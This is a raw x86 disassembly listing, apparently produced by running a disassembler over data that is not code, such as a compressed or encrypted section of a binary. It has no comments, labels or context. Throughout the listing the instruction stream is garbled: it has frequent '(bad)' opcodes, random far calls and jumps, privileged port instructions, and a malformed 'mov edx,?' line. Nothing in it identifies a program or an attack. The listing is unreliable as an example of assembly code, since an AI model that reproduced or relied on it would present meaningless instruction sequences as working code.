  407e08:	test   DWORD PTR [ecx],ebp
  407e0a:	imul   esi
  407e0c:	mov    bh,0x2c
  407e0e:	xchg   ebp,eax
  407e0f:	xchg   esi,eax
  407e10:	mov    edi,0xc294ff3f
  407e15:	aaa    
  407e16:	call   esi
  407e18:	mov    dh,0x8a
  407e1a:	scas   eax,DWORD PTR es:[edi]
  407e1b:	into   
	...
  407e2c:	add    BYTE PTR [eax],al
  407e2e:	mov    bh,0x3f
  407e30:	mov    ch,0xd1
  407e32:	mov    bh,0x3f
  407e34:	call   ecx
  407e36:	aaa    
  407e37:	outs   dx,DWORD PTR ds:[esi]
  407e38:	push   DWORD PTR [esi-0x490f8641]
  407e3e:	mov    bh,0x3f
  407e40:	call   0xff810d62
  407e45:	sahf   
  407e46:	pop    ebp
  407e47:	cmp    cl,ch
  407e49:	sub    edi,DWORD PTR [edi+edi*1+0x3c3d8eff]
  407e50:	call   0x45f79c
  407e55:	mov    al,0xb8
  407e57:	or     al,0x0
  407e59:	sbb    al,0x73
  407e5b:	xor    DWORD PTR [ebx+0x75404aa5],eax
  407e61:	cmc    
  407e62:	inc    ecx
  407e63:	xlat   BYTE PTR ds:[ebx]
  407e64:	jg     0x407e4f
  407e66:	stc    
  407e67:	lea    eax,[ebp+0x51]
  407e6a:	aas    
  407e6b:	mov    edx,0x6e9441f7
  407e70:	inc    DWORD PTR [eax]
  407e72:	cmp    al,0xbc
  407e74:	inc    esp
  407e75:	cld    
  407e76:	cld    
  407e77:	dec    edi
  407e78:	sti    
  407e79:	push   DWORD PTR [esi-0x35]
  407e7c:	(bad)  
  407e7d:	jne    0x407e4e
  407e7f:	fist   DWORD PTR [esi]
  407e81:	mov    ebx,0xc00ac9dc
  407e86:	xchg   DWORD PTR [ecx],ecx
  407e88:	mov    DWORD PTR [ebp-0x9],eax
  407e8b:	pop    edx
  407e8c:	dec    DWORD PTR [esi+edx*2+0xff4fcf]
	...
  407ea3:	add    BYTE PTR [esi],al
  407ea5:	enter  0x7be7,0xe7
  407ea9:	leave  
  407eaa:	dec    BYTE PTR [ebx]
  407eac:	and    edx,DWORD PTR [ebp+0x28]
  407eaf:	push   0xbeee3363
  407eb4:	pop    esp
  407eb5:	dec    esi
  407eb6:	pop    es
  407eb7:	call   0x401b36
  407ebc:	sub    al,0x4e
  407ebe:	idiv   edi
  407ec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ec1:	cmp    al,0xfe
  407ec3:	jne    0x407f10
  407ec5:	fcmovnb st,st(0)
  407ec7:	stos   DWORD PTR es:[edi],eax
  407ec8:	jl     0x407e92
  407eca:	(bad)  
  407ecb:	jne    0x407f44
  407ecd:	enter  0xfc74,0x5c
  407ed1:	dec    esi
  407ed2:	pop    es
  407ed3:	call   0x401b98
  407ed8:	jl     0x407f28
  407eda:	sti    
  407edb:	call   0x40185f
  407ee0:	pop    edx
  407ee1:	lds    eax,FWORD PTR [edi]
  407ee3:	add    dh,ah
  407ee5:	mov    ebp,0xdb5783eb
  407eea:	push   ebp
  407eeb:	push   esi
  407eed:	ss out 0xad,eax
  407ef0:	xor    cl,cl
  407ef2:	dec    BYTE PTR [ebx]
  407ef4:	adc    ecx,DWORD PTR [edi+0x4]
  407ef7:	pop    esi
  407ef8:	sub    al,ah
  407efa:	pop    es
  407efb:	add    dl,bh
  407efd:	test   al,0xbd
  407eff:	out    dx,eax
  407f00:	sub    cl,bh
  407f02:	int    0xb
  407f04:	shl    BYTE PTR [edi-0x71],cl
  407f07:	inc    DWORD PTR [eax]
	...
  407f19:	add    BYTE PTR [ebp+0x7e0f4333],bh
  407f1f:	rol    BYTE PTR [edx],cl
  407f21:	add    dl,bh
  407f23:	out    dx,al
  407f24:	int    0xfb
  407f26:	xchg   edx,eax
  407f27:	repz xchg esp,eax
  407f29:	call   FWORD PTR [ebp-0x6a14424b]
  407f2f:	mov    eax,ds:0x4007ff47
  407f34:	inc    ebx
  407f35:	jne    0x407eb9
  407f37:	adc    al,0x52
  407f39:	scas   al,BYTE PTR es:[edi]
  407f3a:	jge    0x407f7b
  407f3c:	ja     0x407fb3
  407f3e:	add    di,WORD PTR [edx-0x3d8bac99]
  407f45:	dec    edi
  407f47:	push   ebx
  407f48:	lds    eax,FWORD PTR [eax-0x3ff1d406]
  407f4e:	iret   
  407f4f:	sub    DWORD PTR [esi],ebp
  407f51:	cmp    eax,0xd8ac5c81
  407f56:	add    ch,ch
  407f58:	add    ebp,eax
  407f5a:	ja     0x407f5b
  407f5c:	add    eax,DWORD PTR [eax]
  407f5e:	stc    
  407f5f:	jnp    0x407eee
  407f61:	jne    0x407f85
  407f63:	les    ebp,FWORD PTR [ebx]
  407f65:	cmp    BYTE PTR [ebx-0x21826d5],bh
  407f6b:	lods   al,BYTE PTR ds:[esi]
  407f6c:	add    eax,DWORD PTR [eax]
  407f6e:	add    DWORD PTR [ecx+edi*4+0x1],ebp
  407f72:	and    DWORD PTR [ebx],esi
  407f74:	lea    edx,[eax]
  407f76:	cmp    al,0x2c
  407f78:	add    edx,DWORD PTR [eax-0x58]
  407f7b:	mov    esi,0xe7b8
	...
  407f90:	cmc    
  407f91:	inc    eax
  407f92:	or     ebp,eax
  407f94:	rep lods eax,DWORD PTR ds:[esi]
  407f96:	inc    edx
  407f97:	inc    DWORD PTR [eax+0x5]
  407f9a:	ror    DWORD PTR [ebx+0x41f850a],0x4f
  407fa1:	jae    0x407f64
  407fa3:	add    al,0xea
  407fa5:	sub    eax,0xd4f438f
  407faa:	push   ecx
  407fab:	push   eax
  407fac:	nop
  407fad:	cmp    eax,0x412f433e
  407fb2:	ss mov ecx,0xbb43da1
  407fb8:	xchg   edx,eax
  407fb9:	cmp    BYTE PTR [ebx+0x43],dl
  407fbc:	popf   
  407fbd:	cmp    eax,0xefa22f94
  407fc2:	inc    esi
  407fc3:	inc    ebx
  407fc4:	lea    ecx,[edi+0x2d2a33a4]
  407fca:	call   0xd404:0x123d7d77
  407fd1:	dec    ebx
  407fd2:	sub    ecx,DWORD PTR [edx+edi*8]
  407fd5:	xlat   BYTE PTR ds:[ebx]
  407fd6:	popa   
  407fd7:	xor    BYTE PTR [ecx+0x48],bh
  407fda:	in     eax,0xad
  407fdc:	pop    ebp
  407fdd:	stos   DWORD PTR es:[edi],eax
  407fde:	repz inc edx
  407fe0:	iret   
  407fe1:	or     al,0xc1
  407fe3:	(bad)  
  407fe4:	mov    al,ds:0xbf8cce3d
  407fe9:	inc    eax
  407fea:	push   ecx
  407feb:	imul   eax,DWORD PTR [edx],0xaf42e8c4
  407ff1:	or     al,0xc1
  407ff3:	push   0x0
	...
  408005:	add    BYTE PTR [esi],ch
  408007:	cmp    eax,0xa525adae
  40800c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40800d:	sti    
  40800e:	mov    edx,0xd22f1104
  408013:	ret    
  408014:	call   0xc03e475b
  408019:	les    eax,FWORD PTR ds:0xfd738525
  40801f:	cmp    al,0xf2
  408021:	inc    ebx
  408022:	outs   dx,BYTE PTR ds:[esi]
  408023:	pop    ds
  408024:	add    BYTE PTR [ecx],al
  408026:	dec    eax
  408027:	std    
  408028:	inc    eax
  408029:	jmp    0x9908a4f7
  40802e:	cmp    BYTE PTR [eax+edx*2],bh
  408031:	mov    ecx,0x4107b238
  408036:	adc    al,0x3b
  408038:	dec    DWORD PTR [esi+0x11]
  40803b:	inc    ebx
  40803c:	lods   eax,DWORD PTR ds:[esi]
  40803d:	inc    esi
  40803e:	cmp    BYTE PTR [edi+0x770b5119],ch
  408044:	push   DWORD PTR [esi]
  408046:	cld    
  408047:	inc    esp
  408048:	je     0x40804e
  40804a:	push   esi
  40804b:	inc    esi
  40804c:	cmp    BYTE PTR [eax+0x4ae7d4f9],ch
  408052:	push   cs
  408053:	cmp    al,0xff
  408055:	sub    DWORD PTR [ebx],0xa9e940fd
  40805b:	and    al,0x98
  40805d:	cmp    BYTE PTR [eax],bh
  40805f:	cmp    al,0x50
  408061:	cdq    
  408062:	mov    eax,0xe40107b1
  408067:	cmp    bh,bh
  408069:	out    dx,al
	...
  40807a:	add    BYTE PTR [eax],al
  40807c:	adc    BYTE PTR [ebx-0x51441953],dl
  408082:	sbb    edx,ecx
  408084:	fdiv   DWORD PTR [ebp-0x1]
  408087:	(bad)  
  408088:	inc    DWORD PTR [esp+esi*2+0x4]
  40808c:	xchg   esi,eax
  40808d:	inc    esi
  40808e:	cmp    BYTE PTR [eax],ch
  408090:	not    ah
  408092:	out    0x3a,eax
  408094:	test   eax,0xc841ff3b
  408099:	cld    
  40809a:	inc    eax
  40809b:	jmp    0x58a8a4e9
  4080a0:	mov    ebx,0xbb39503b
  4080a5:	mov    cl,0x7
  4080a7:	xor    DWORD PTR [edi+0x3b],0xa2d68eff
  4080ae:	lods   al,BYTE PTR ds:[esi]
  4080af:	add    BYTE PTR [esi+eax*8+0x69],dh
  4080b3:	and    ecx,DWORD PTR [ebx+0x64ffb0b6]
  4080b9:	or     al,al
  4080bb:	je     0x40807b
  4080bd:	outs   dx,DWORD PTR ds:[esi]
  4080be:	sar    DWORD PTR [eax],0x92
  4080c1:	pop    es
  4080c2:	push   eax
  4080c3:	call   0x3f3768
  4080c8:	mov    ebx,0xd34137d5
  4080cd:	push   edi
  4080ce:	out    0x38,eax
  4080d0:	inc    edx
  4080d1:	(bad)  
  4080d2:	(bad)  
  4080d3:	push   eax
  4080d4:	xchg   ebx,eax
  4080d5:	les    esi,FWORD PTR [eax+ecx*1+0x3b]
  4080d9:	push   edx
  4080da:	std    
  4080db:	call   esp
  4080dd:	call   0x412e17
	...
  4080f2:	aam    0xc5
  4080f4:	(bad)  
  4080f5:	jne    0x4080ee
  4080f7:	lds    esi,FWORD PTR [eax+ecx*1-0x5]
  4080fb:	scas   eax,DWORD PTR es:[edi]
  4080fc:	test   eax,0xc1cff4ff
  408101:	add    al,0x93
  408103:	push   edx
  408104:	mov    ch,ah
  408106:	loop   0x4080d4
  408108:	fcomi  st,st(7)
  40810a:	les    ecx,FWORD PTR fs:[ebp+eax*2+0x75fe5757]
  408112:	arpl   sp,ax
  408114:	je     0x408122
  408116:	sub    esi,DWORD PTR [esi+edi*2+0x0]
  40811a:	arpl   WORD PTR [eax],cx
  40811c:	ror    BYTE PTR [edi],0xde
  40811f:	test   DWORD PTR [ecx],eax
  408121:	add    BYTE PTR [ebx-0x34],dl
  408124:	inc    esp
  408125:	clc    
  408126:	and    eax,DWORD PTR [edi]
  408128:	add    BYTE PTR [eax],al
  40812a:	pop    esp
  40812b:	inc    edx
  40812c:	repz call FWORD PTR [edi+eax*1]
  408130:	add    BYTE PTR [edx+0x13],ch
  408133:	imul   edi,edi,0xff692369
  408139:	mov    edx,?
  40813b:	call   0xa0b7d177
  408140:	ss idiv ebp
  408143:	adc    ebx,0x40846ffe
  408149:	jne    0x408139
  40814b:	test   dl,al
  40814d:	jle    0x408149
  40814f:	sub    ecx,DWORD PTR [eax+eax*8]
  408152:	sub    WORD PTR [edx],bp
  408155:	add    DWORD PTR [eax],0x0
	...
  408167:	add    bl,bh
  408169:	sub    eax,DWORD PTR [ebx]
  40816b:	push   0xffc3048a
  408170:	les    edx,FWORD PTR [ecx+0x13]
  408173:	call   0xff803dce
  408178:	dec    edx
  408179:	mov    bh,0x52
  40817b:	lea    esi,[edi-0x8]
  40817e:	aaa    
  40817f:	jmp    DWORD PTR [ebp+0x46e7d59c]
  408185:	fdivr  QWORD PTR [edi]
  408187:	inc    DWORD PTR [ebx-0x7208cd5f]
  40818d:	adc    ebp,DWORD PTR [ebx]
  40818f:	stos   BYTE PTR es:[edi],al
  408190:	push   esi
  408191:	or     eax,DWORD PTR [eax+0x6a]
  408194:	cli    
  408195:	xchg   ebx,eax
  408196:	and    BYTE PTR [ecx],bh
  408198:	mov    ebx,0x6ab5402b
  40819d:	cmp    edi,DWORD PTR [edi]
  40819f:	jmp    DWORD PTR [ebp-0x4f]
  4081a2:	push   cs
  4081a3:	call   0xff801537
  4081a8:	and    DWORD PTR [ecx+0x534df727],0xffffffaa
  4081af:	(bad)  
  4081b0:	fld    QWORD PTR [ebx]
  4081b2:	std    
  4081b3:	inc    eax
  4081b4:	cli    
  4081b5:	inc    edx
  4081b6:	jns    0x4081a8
  4081b8:	sub    eax,0xa7ff3f7b
  4081bd:	pop    ds
  4081be:	sub    edx,DWORD PTR [edx-0x76c094ab]
  4081c4:	ja     0x4081cb
  4081c6:	mov    DWORD PTR [edi],esi
  4081c8:	adc    eax,0x4133a
	...
  4081dd:	add    BYTE PTR [edx+0x5c4d009],ah
  4081e3:	cmp    edx,DWORD PTR [esp+esi*1+0x5]
  4081e7:	cmp    al,BYTE PTR [esi-0x6ef690c1]
  4081ed:	mov    bh,0x9c
  4081ef:	cmp    DWORD PTR [esi-0x73],esi
  4081f2:	jg     0x40821c
  4081f4:	jbe    0x408235
  4081f6:	(bad)  [esi-0x4105418]
  4081fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081fd:	add    ecx,ebp
  4081ff:	outs   dx,DWORD PTR ds:[esi]
  408200:	pop    ecx
  408201:	aaa    
  408202:	lds    edi,FWORD PTR [ecx]
  408204:	dec    esi
  408205:	mov    ecx,0x6ea52cf1
  40820a:	mov    ch,0x39
  40820c:	jo     0x408197
  40820e:	mov    ds:0x103f3631,al
  408213:	add    eax,0xc3e2f1c1
  408218:	call   0x1674d15b
  40821d:	aas    
  40821e:	lea    edi,[ecx]
  408220:	pushf  
  408221:	setb   bl
  408224:	cmp    eax,0x6c8b7d3f
  408229:	pusha  
  40822a:	ins    DWORD PTR es:[edi],dx
  40822b:	cmp    esi,edi
  40822d:	sub    BYTE PTR [edi+0x653efe20],0x4
  408234:	je     0x408242
  408236:	jns    0x4082af
  408238:	leave  
  408239:	ss push ebp
  40823b:	cmp    ecx,ebp
  40823d:	mov    bh,0xd6
  40823f:	test   DWORD PTR [edi+ebp*1+0x0],edx
	...
  408252:	add    BYTE PTR [eax],al
  408254:	dec    ebp
  408255:	cmp    esi,ecx
  408257:	add    eax,esi
  408259:	fsubr  DWORD PTR [ecx-0x80]
  40825c:	and    dh,BYTE PTR [ecx]
  40825e:	mov    esi,0xffb0fa3e
  408263:	sbb    DWORD PTR [esi+0x39],edx
  408266:	(bad)  
  408267:	mov    esi,0xf175399f
  40826c:	loope  0x40822b
  40826e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40826f:	sahf   
  408270:	int3   
  408271:	cmp    DWORD PTR [ebp-0xc6337b],esi
  408277:	mov    es,WORD PTR [edx+0x1]
  40827a:	call   0xff78e435
  40827f:	jle    0x4082f3
  408281:	sub    eax,0x382476f7
  408286:	jne    0x408269
  408288:	adc    DWORD PTR [esi-0x58],eax
  40828b:	data16 adc al,0x38
  40828e:	mov    ch,0x45
  408290:	add    al,0x38
  408292:	call   DWORD PTR [esi-0x7e]
  408295:	add    al,ch
  408297:	call   0x2532:0x46ff3851
  40829e:	idiv   DWORD PTR [esi]
  4082a0:	in     al,dx
  4082a1:	aaa    
  4082a2:	jne    0x408285
  4082a4:	shl    DWORD PTR [ecx-0x58],1
  4082a7:	fdiv   QWORD PTR cs:[edi]
  4082aa:	mov    ch,0x45
  4082ac:	int3   
  4082ad:	aaa    
  4082ae:	call   FWORD PTR [esi]
  4082b0:	push   edx
  4082b1:	add    al,ch
  4082b3:	jle    0x4082c6
  4082b5:	cmp    bh,bh
  4082b7:	push   cs
	...
  4082c8:	add    BYTE PTR [eax],al
  4082ca:	add    ah,BYTE PTR [ecx]
  4082cc:	test   DWORD PTR [esi],0x52a12d34
  4082d2:	sub    al,0x38
  4082d4:	(bad)  
  4082d5:	cmp    al,0x19
  4082d7:	xor    bh,bh
  4082d9:	out    dx,al
  4082da:	adc    BYTE PTR [edi+0x3817e6ab],cl
  4082e0:	mov    ch,0xcd
  4082e2:	pop    es
  4082e3:	cmp    bh,bh
  4082e5:	shl    DWORD PTR [ebx+0x6c],0xff
  4082e9:	into   
  4082ea:	push   DWORD PTR [ecx-0x18]
  4082ed:	add    BYTE PTR [edx+edi*8-0x2],dh
  4082f1:	call   0x3f3099
  4082f6:	ins    BYTE PTR es:[edi],dx
  4082f7:	mov    al,0xdb
  4082f9:	test   DWORD PTR [edx+edi*8-0x19],0xfef9a875
  408301:	jmp    DWORD PTR [esi+0x6cfff6f0]
  408307:	cli    
  408308:	je     0x408316
  40830a:	ins    BYTE PTR es:[edi],dx
  40830b:	jo     0x408314
  40830d:	call   0x3f7cd0
  408312:	ins    BYTE PTR es:[edi],dx
  408313:	mov    al,0xef
  408315:	imul   DWORD PTR [edx+edi*8-0x19]
  408319:	pop    ecx
  40831a:	cmp    dl,bh
  40831c:	(bad)  
  40831d:	jmp    DWORD PTR [esi+0x2d51e8fb]
  408323:	cli    
  408324:	(bad)  
  408325:	jmp    DWORD PTR [esi-0x515c1809]
  40832b:	add    eax,DWORD PTR [eax]
  40832d:	leave  
	...
  40833e:	add    BYTE PTR [eax],al
  408340:	loope  0x408356
  408342:	add    BYTE PTR [ebp+0x28],dl
  408345:	cmc    
  408346:	add    ah,0xef
  408349:	push   0xffffffff
  40834b:	imul   eax,ebp,0xeb0874f8
  408351:	ins    DWORD PTR es:[edi],dx
  408352:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408353:	(bad)  
  408354:	in     al,dx
  408355:	mov    eax,DWORD PTR [ebp-0x4]
  408358:	jnp    0x408391
  40835a:	cmp    BYTE PTR [ecx-0x6d],al
  40835d:	imul   eax,DWORD PTR [ecx],0x0
  408360:	arpl   WORD PTR [ebx-0x14948a01],ax
  408366:	idiv   ch
  408368:	ins    BYTE PTR es:[edi],dx
  408369:	clc    
  40836a:	addr16 cmp al,0xaa
  40836d:	inc    edx
  40836e:	(bad)  
  40836f:	(bad)  
  408370:	idiv   BYTE PTR [ecx]
  408372:	sub    BYTE PTR [ecx+0x63],al
  408375:	clc    
  408376:	je     0x408380
  408378:	cli    
  408379:	inc    ebp
  40837a:	daa    
  40837b:	std    
  40837c:	cmp    eax,0x36753c46
  408381:	ds mov dh,0x7
  408384:	and    dh,bh
  408386:	imul   edi,edi,0x25
  408389:	fs inc ecx
  40838b:	add    al,0xfa
  40838d:	adc    BYTE PTR [ecx+0x5f697bec],cl
  408393:	test   DWORD PTR ds:0x6458e96,0xea753cfd
  40839d:	xchg   BYTE PTR [esi-0x41171df5],dh
  4083a3:	inc    DWORD PTR [eax]
	...
  4083b5:	add    ch,ch
  4083b7:	xor    eax,DWORD PTR [ebx+0xf]
  4083ba:	jg     0x4083aa
  4083bc:	add    DWORD PTR [eax],eax
  4083be:	cli    
  4083bf:	pop    esi
  4083c0:	(bad)  
  4083c1:	idiv   edx
  4083c3:	sub    eax,DWORD PTR [ebx]
  4083c5:	add    BYTE PTR [ebp-0x200c89f],dh
  4083cb:	sub    eax,DWORD PTR [ebx]
  4083cd:	push   0xfffffffa
  4083cf:	inc    ecx
  4083d0:	add    ebp,DWORD PTR [edx-0x6]
  4083d3:	push   ecx
  4083d4:	add    ecx,DWORD PTR [ebp-0x732d0fc9]
  4083da:	jg     0x4083d4
  4083dc:	xor    edi,edi
  4083de:	popf   
  4083df:	pushf  
  4083e0:	cmp    al,0x75
  4083e2:	xchg   edx,eax
  4083e3:	fbstp  TBYTE PTR [ebp-0x41d15d05]
  4083e9:	inc    DWORD PTR [ebp-0x88bbcdd]
  4083ef:	add    al,0x82
  4083f1:	add    edx,edi
  4083f3:	sub    ebp,DWORD PTR [ebx+0x36d22af]
  4083f9:	(bad)  
  4083fa:	out    dx,eax
  4083fb:	pop    ebx
  4083fc:	sub    edi,DWORD PTR [ecx]
  4083fe:	mov    WORD PTR [edi],fs
  408400:	cmp    edx,DWORD PTR [eax-0x7f]
  408403:	add    eax,0x317789b9
  408408:	(bad)  
  408409:	cmp    eax,DWORD PTR [ebp-0x2b]
  40840c:	cmp    ch,BYTE PTR [ebx+edx*1]
  40840f:	addr16 into 
  408411:	cmp    eax,DWORD PTR [ebx+0x2d33b980]
  408417:	sar    DWORD PTR ss:[ebx+0x0],1
	...
  40842a:	add    BYTE PTR [eax],al
  40842c:	push   ebx
  40842d:	ss mov dh,0xae
  408430:	sbb    eax,0xbafd2d9e
  408435:	add    al,0xa6
  408437:	jno    0x408443
  408439:	cs sahf 
  40843b:	cmp    eax,DWORD PTR ds:0x782be4b0
  408441:	push   0x7f833b8e
  408446:	lea    esi,[ebx]
  408448:	in     eax,dx
  408449:	xor    eax,0x8a520413
  40844e:	mov    al,0xc4
  408450:	fnsave [esi]
  408452:	xor    al,0x34
  408454:	int    0x35
  408456:	cmp    ax,WORD PTR [edi+0x9]
  40845a:	push   ecx
  40845b:	mov    ds:0x8d563596,eax
  408460:	ja     0x408486
  408462:	push   esi
  408463:	cmp    esi,DWORD PTR [ebp+0x22abe8aa]
  408469:	cld    
  40846a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40846b:	add    esp,DWORD PTR [ebp-0x62ccc691]
  408471:	xor    eax,0x2d01b12e
  408476:	mov    ch,0x68
  408478:	lea    esi,ds:0x2d968170
  40847e:	push   ss
  40847f:	cmp    edx,DWORD PTR [eax]
  408481:	add    eax,0xc432b681
  408486:	call   0xf6752bc5
  40848b:	cmp    ah,BYTE PTR [ebp+0x35]
  40848e:	add    BYTE PTR [eax+eax*1+0x0],bh
	...
  4084a2:	cmc    
  4084a3:	sub    al,0x31
  4084a5:	cmp    al,0x11
  4084a7:	mov    DWORD PTR ss:[ecx+eiz*1+0x2e],ebp
  4084ac:	(bad)  
  4084ad:	ficom  WORD PTR [edi+0x3e716735]
  4084b3:	(bad)  
  4084b4:	dec    ebp
  4084b6:	stos   BYTE PTR es:[edi],al
  4084b7:	xor    al,0xf7
  4084b9:	(bad)  
  4084ba:	lock xor eax,0xed1ed75
  4084c0:	lods   eax,DWORD PTR ds:[esi]
  4084c1:	mov    dh,0xe0
  4084c3:	mov    eax,DWORD PTR [ebp-0xca3773]
  4084c9:	push   0xffffff92
  4084cb:	and    bh,dh
  4084cd:	sahf   
  4084ce:	rol    BYTE PTR [esi*2-0x1f888b20],0x96
  4084d6:	xor    BYTE PTR [eax+eax*1],dh
  4084d9:	std    
  4084da:	call   0xff34:0x288dbd87
  4084e1:	jmp    0x2cc35573
  4084e6:	and    DWORD PTR [edi+edi*8],edi
  4084e9:	data16 stc 
  4084eb:	mov    eax,0x4f9d152
  4084f0:	out    dx,eax
  4084f1:	xchg   edi,eax
  4084f2:	add    BYTE PTR [edx+0x6ac94107],bh
  4084f8:	inc    DWORD PTR [esi-0x10]
  4084fb:	jns    0x4084e9
  4084fd:	ss loopne 0x408533
  408500:	(bad)  
  408501:	mov    esp,0x87a41cf1
	...
  408516:	add    BYTE PTR [eax],al
  408518:	shl    BYTE PTR [ebx],1
  40851a:	call   FWORD PTR [ecx+eiz*8+0x3b]
  40851e:	call   FWORD PTR [esi]
  408520:	sar    BYTE PTR [ecx+0x6b6b0107],0xff
  408527:	push   cs
  408528:	xor    BYTE PTR [edx-0x1c],bh
  40852b:	add    BYTE PTR [esi+ebp*8-0x2],ch
  40852f:	(bad)  
  408530:	out    dx,al
  408531:	jmp    edi
  408533:	mov    BYTE PTR [ebp+0xefffeee],ch
  408539:	call   0xee958534
  40853e:	je     0x408548
  408540:	sub    esi,DWORD PTR [ebx-0x5b]
  408543:	jmp    DWORD PTR [esi+ebp*8]
  408546:	mov    ah,0xdc
  408548:	dec    esp
  408549:	out    dx,al
  40854a:	(bad)  
  40854b:	(bad)  
  40854c:	out    dx,al
  40854d:	add    al,ch
  40854f:	ins    BYTE PTR es:[edi],dx
  408550:	jge    0x408540
  408552:	(bad)  
  408553:	call   FWORD PTR [esi+0x64fff6e4]
  408559:	loope  0x4085d0
  40855b:	test   eax,0xb5feee54
  408560:	jae    0x408558
  408562:	(bad)  
  408563:	(bad)  
  408564:	jnp    0x4085c8
  408566:	test   al,0xff
  408568:	test   ch,ch
  40856a:	mov    ah,0xec
  40856c:	ins    BYTE PTR es:[edi],dx
  40856d:	out    dx,al
  40856e:	(bad)  
  40856f:	call   0x3f2567
  408574:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  408576:	out    0xf7,eax
  408578:	fs out dx,al
  40857a:	out    0x55,eax
	...
  40858c:	add    BYTE PTR [eax],al
  40858e:	push   0xffffffed
  408590:	(bad)  
  408591:	jmp    FWORD PTR [esi-0x34]
  408594:	idiv   bh
  408596:	and    al,0xe1
  408598:	dec    ecx
  408599:	test   eax,0xb5feee44
  40859e:	repz cmc 
  4085a0:	(bad)  
  4085a1:	jmp    esp
  4085a3:	arpl   WORD PTR [ebx],cx
  4085a5:	call   FWORD PTR [esi-0x1]
  4085a8:	out    0x3d,eax
  4085aa:	in     eax,0xed
  4085ac:	(bad)  
  4085ad:	jmp    FWORD PTR [esi]
  4085af:	stc    
  4085b0:	idiv   bh
  4085b2:	in     al,0xe0
  4085b4:	sub    eax,0x391afaa9
  4085b9:	(bad)  
  4085ba:	mov    edi,0x6c512b15
  4085bf:	or     bh,BYTE PTR [ecx]
  4085c1:	(bad)  
  4085c2:	out    dx,eax
  4085c3:	xor    DWORD PTR [ebx],ebp
  4085c5:	js     0x4085a8
  4085c7:	sbb    eax,0x5138c903
  4085cc:	add    edx,DWORD PTR [ebp-0x7f]
  4085cf:	pop    ecx
  4085d0:	test   ah,al
  4085d2:	inc    esi
  4085d3:	xlat   BYTE PTR ds:[ebx]
  4085d4:	add    ebp,DWORD PTR [edx-0x1b]
  4085d7:	pop    edx
  4085d8:	scas   al,BYTE PTR es:[edi]
  4085d9:	pop    es
  4085da:	and    bl,ch
  4085dc:	popa   
  4085dd:	jmp    FWORD PTR ds:0x92fbbdb4
  4085e3:	mov    dl,bh
  4085e5:	inc    eax
  4085e6:	cli    
  4085e7:	jp     0x4085d7
  4085e9:	ds jecxz 0x4085c8
  4085ec:	add    edi,edi
  4085ee:	xchg   DWORD PTR ds:0xf62b,esi
	...
  408604:	pop    es
  408605:	xchg   edx,eax
  408606:	cmp    BYTE PTR [eax+0x57],ch
  408609:	push   esp
  40860a:	ret    0x5dff
  40860d:	push   ds
  40860e:	add    eax,DWORD PTR [eax]
  408610:	jp     0x40859d
  408612:	scas   al,BYTE PTR es:[edi]
  408613:	pop    es
  408614:	ror    BYTE PTR [eax-0x442200ca],cl
  40861a:	lods   eax,DWORD PTR ds:[esi]
  40861b:	sti    
  40861c:	aad    0x39
  40861e:	or     ebp,eax
  408620:	sub    DWORD PTR [edx-0x214c00c8],eax
  408626:	(bad)  
  408627:	jmp    DWORD PTR [esi]
  408629:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40862a:	cmp    DWORD PTR es:[esi-0x5200d010],0x4afbbdb9
  408635:	rep lods eax,DWORD PTR ds:[esi]
  408637:	setge  BYTE PTR [ecx+0x7]
  40863b:	call   0x43fd33
  408640:	add    DWORD PTR ds:0x827f0829,eax
  408646:	jmp    0xac8a804e
  40864b:	cmp    edi,edx
  40864d:	add    al,0xe9
  40864f:	add    esi,DWORD PTR ds:0xfd37fcc8
  408655:	add    al,0xe9
  408657:	lods   eax,DWORD PTR ds:[esi]
  408658:	pop    ebp
  408659:	pushf  
  40865a:	call   0xe8dcdc0c
  40865f:	xchg   BYTE PTR [edi+0x7f893938],dh
  408665:	cmp    esi,edx
  408667:	aaa    
	...
  408678:	add    BYTE PTR [eax],al
  40867a:	cmp    eax,0x2db1d5d5
  40867f:	xor    dl,BYTE PTR [eax+edi*1+0x22]
  408683:	xor    BYTE PTR [ebx+0x4],al
  408686:	cli    
  408687:	std    
  408688:	test   al,0xb0
  40868a:	sti    
  40868b:	sbb    eax,0x217f891c
  408690:	mov    dh,0x37
  408692:	or     eax,0xe8173d5
  408697:	cmp    bl,BYTE PTR [esi+0x1c31aa37]
  40869d:	adc    al,0xf5
  40869f:	mov    bh,0xdc
  4086a1:	sub    ebp,DWORD PTR [esi+ebx*2-0x7a]
  4086a5:	aaa    
  4086a6:	jae    0x40862f
  4086a8:	jns    0x4086d9
  4086aa:	fnsave [ecx]
  4086ac:	loop   0x4086f1
  4086ae:	dec    esi
  4086af:	out    0x69,eax
  4086b1:	jns    0x408691
  4086b3:	cmp    DWORD PTR [esi+0x37],esp
  4086b6:	cli    
  4086b7:	mov    eax,0x31bdabff
  4086bc:	inc    esi
  4086bd:	jbe    0x408674
  4086bf:	ja     0x4086fe
  4086c1:	das    
  4086c2:	lods   eax,DWORD PTR ds:[esi]
  4086c3:	xor    DWORD PTR [esi+0x71],eax
  4086c6:	stos   BYTE PTR es:[edi],al
  4086c7:	cmp    DWORD PTR [esi],edi
  4086c9:	aaa    
  4086ca:	popf   
  4086cb:	mov    bh,0xff
  4086cd:	loopne 0x4086b0
  4086cf:	inc    ecx
  4086d0:	leave  
  4086d1:	lds    esi,FWORD PTR cs:[ecx]
  4086d4:	mov    ch,0x19
  4086d6:	aad    0x31
  4086d8:	call   DWORD PTR [ecx]
  4086da:	xchg   ebp,eax
  4086db:	imul   edi,edi,0x16
	...
  4086ed:	add    BYTE PTR [eax],al
  4086ef:	add    BYTE PTR ds:0x7602f7c8,ch
  4086f5:	xor    DWORD PTR [ebp+0x5],esi
  4086f8:	push   ss
  4086f9:	mov    cl,0x79
  4086fb:	jmp    0xe602c2f9
  408700:	stc    
  408701:	xlat   BYTE PTR ds:[ebx]
  408702:	mov    bh,ch
  408704:	js     0x40874e
  408706:	cld    
  408707:	push   ebx
  408708:	(bad)  
  408709:	sahf   
  40870a:	pop    ss
  40870b:	fimul  WORD PTR [edx-0x64d217f7]
  408711:	xor    edi,edi
  408713:	pusha  
